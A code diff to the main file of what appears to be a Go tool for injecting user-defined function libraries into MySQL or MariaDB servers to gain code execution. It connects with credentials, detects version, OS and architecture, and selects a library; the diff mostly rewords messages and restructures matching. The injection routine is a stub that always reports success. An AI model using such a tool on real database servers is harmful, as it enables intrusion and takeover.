@@ -44,7 +44,7 @@ func main() {
 	for t, path := range cfg.UDF {
 		data, err := ioutil.ReadFile(path)
 		if err != nil {
-			fmt.Print(err)
+			fmt.Print("load UDF failed:", err)
 			return
 		}
 		udf[t] = &injecter.UDF{
@@ -52,6 +52,7 @@ func main() {
 			Name: injecter.RandomStr(8) + "." + injecter.RandomStr(3),
 			Data: data,
 		}
+		fmt.Printf("[+] load UDF: %s\n", t)
 	}
 	// connect host
 	var handle injecter.Handle
@@ -59,10 +60,12 @@ func main() {
 	case "direct":
 		handle, err = injecter.Connect(host, username, password)
 		if err != nil {
-			fmt.Print(err)
+			fmt.Print("direct connect failed:", err)
 			return
 		}
+		fmt.Printf("[+] direct connect %s\n", host)
 	case "pma":
+		fmt.Print("not support now")
 		return
 	default:
 		fmt.Print("unknown inject mode")
@@ -70,66 +73,63 @@ func main() {
 	}
 	// start inject
 	if len(udf) == 0 || len(cfg.Func) == 0 {
-		fmt.Print("[!] no UDF or no Functions")
+		fmt.Print("[-] no UDF or no Functions")
 		return
 	}
 	if !injecter.IsDynamic(handle) {
-		fmt.Print("[!] not dynamic")
+		fmt.Print("[-] not dynamic")
 		return
 	}
 	// select inject method
 	version, err := injecter.GetVersion(handle)
 	if err != nil {
-		fmt.Println("[!]", err)
+		fmt.Println("[-]", err)
 		return
 	}
 	fmt.Println("[+] version:", version)
 	ver, err := injecter.ParseVersion(version)
 	if err != nil {
-		fmt.Println("[!]", err)
+		fmt.Println("[-]", err)
 		return
 	}
 	// select inject udf
 	os, err := injecter.GetOS(handle)
 	if err != nil {
-		fmt.Println("[!]", err)
+		fmt.Println("[-]", err)
 		return
 	}
 	arch, err := injecter.GetMachine(handle)
 	if err != nil {
-		fmt.Println("[!]", err)
+		fmt.Println("[-]", err)
 		return
 	}
-	fmt.Println("[+] OS&Arch:", os+"_"+arch)
-	udfData, ok := udf[os+"_"+arch]
-	if !ok { // try all udf
-		fmt.Println("[!] no compare")
-		for _, u := range udf {
-			// version < 5.1.xx
-			if ver < 501 {
-				err = injectUDF(handle, u, cfg.Func, false)
-				if err == nil {
-					return
-				}
-				fmt.Println("[!] no compare")
-			} else { // include MariaDB
-				err = injectUDF(handle, u, cfg.Func, true)
-				if err == nil {
-					return
-				}
-				fmt.Println("[!] no compare")
+	fmt.Println("[+] OS & Arch:", os+"_"+arch)
+	// match
+	if udfData, ok := udf[os+"_"+arch]; ok {
+		if ver < 501 {
+			_ = injectUDF(handle, udfData, cfg.Func, false)
+		} else {
+			_ = injectUDF(handle, udfData, cfg.Func, true)
+		}
+		return
+	}
+	fmt.Println("[!] unmatched OS & Arch, attempt all UDF")
+	for t, u := range udf {
+		fmt.Println("[+] attempt", t)
+		if ver < 501 { // version < 5.1.xx
+			if injectUDF(handle, u, cfg.Func, false) {
+				return
+			}
+		} else { // include MariaDB
+			if injectUDF(handle, u, cfg.Func, true) {
+				return
 			}
 		}
-		fmt.Println("[-] no compare")
-		return
 	}
-	if ver < 501 {
-		injectUDF(handle, udfData, cfg.Func, false)
-	} else {
-		injectUDF(handle, udfData, cfg.Func, true)
-	}
+	fmt.Println("[-] all attempts failed")
 }
 
-func injectUDF(handle injecter.Handle, udf *injecter.UDF, funcs []*injecter.Func, v51 bool) error {
-	return nil
+func injectUDF(handle injecter.Handle, udf *injecter.UDF, funcs []*injecter.Func, v51 bool) bool {
+	fmt.Println("[*] inject successfully")
+	return true
 }
